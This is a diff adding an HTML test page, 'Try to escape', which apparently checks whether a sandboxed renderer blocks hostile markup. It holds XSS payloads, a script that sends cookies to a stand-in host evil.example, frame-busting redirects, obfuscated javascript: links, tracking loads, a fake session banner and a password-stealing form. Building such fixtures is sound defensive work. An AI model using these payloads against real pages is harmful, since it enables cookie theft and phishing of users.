@@ -1,0 +1,56 @@
+<!doctype html>
+<html>
+<head>
+  <title>You have been hacked</title>
+  <meta http-equiv="refresh" content="0;url=https://evil.example/">
+  <base href="https://evil.example/">
+  <link rel="stylesheet" href="https://evil.example/steal.css">
+  <script>top.location = 'https://evil.example/?c=' + document.cookie;</script>
+</head>
+<body onload="parent.document.body.innerHTML = 'pwned'">
+  <style>
+    @import url(https://evil.example/track.css);
+    body { font-family: Georgia, serif; max-width: 40em; margin: 4em auto; line-height: 1.6; }
+    .fake { position: fixed; top: 0; left: 0; right: 0; padding: 12px; background: #c4453d; color: #fff; z-index: 99999; }
+  </style>
+
+  <div class="fake" style="position: fixed; top: 0;">Your session has expired. Sign in again below.</div>
+
+  <h1>Try to escape</h1>
+  <p>
+    This page was published to see what a stranger's HTML can do to the browser it is read in.
+    Every trick below is a real attempt. If you are reading this calmly, all of them failed.
+  </p>
+
+  <h2>Scripts</h2>
+  <script>parent.postMessage({ type: 'nav', href: 'owl.zz' }, '*');</script>
+  <img src="x" onerror="parent.document.title = 'pwned'" alt="a broken picture">
+  <svg onload="alert(1)"><script>alert(2)</script></svg>
+  <p onclick="alert(3)">Clicking this paragraph should do nothing.</p>
+
+  <h2>Links that leave</h2>
+  <p><a href="javascript:alert(document.cookie)">A javascript: link</a></p>
+  <p><a href="java&#x09;script:alert(1)">An obfuscated javascript: link</a></p>
+  <p><a href="https://evil.example/" target="_top">A link that takes over the whole tab</a></p>
+  <p><a href="tidepool.zz" target="_blank">A link that opens a popup</a></p>
+  <p><a href="//evil.example/">A protocol-relative link</a></p>
+
+  <h2>Things that phone home</h2>
+  <img src="https://evil.example/pixel.gif" alt="a tracking pixel">
+  <iframe src="https://evil.example/"></iframe>
+  <object data="https://evil.example/x.swf"></object>
+  <embed src="https://evil.example/x.swf">
+
+  <h2>A form that wants your password</h2>
+  <form action="https://evil.example/steal" method="post">
+    <label>Password <input type="password" name="password"></label>
+    <button>Sign in</button>
+  </form>
+
+  <h2>What still works</h2>
+  <p>Ordinary links do: <a href="tidepool.zz">tidepool.zz</a>, <a href="zz://fieldguide.zz">zz://fieldguide.zz</a>,
+    and <a href="#end">a jump to the end of this page</a>.</p>
+  <img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" alt="an inline image">
+  <p id="end">The end. Salt &amp; pepper &lt;3</p>
+</body>
+</html>
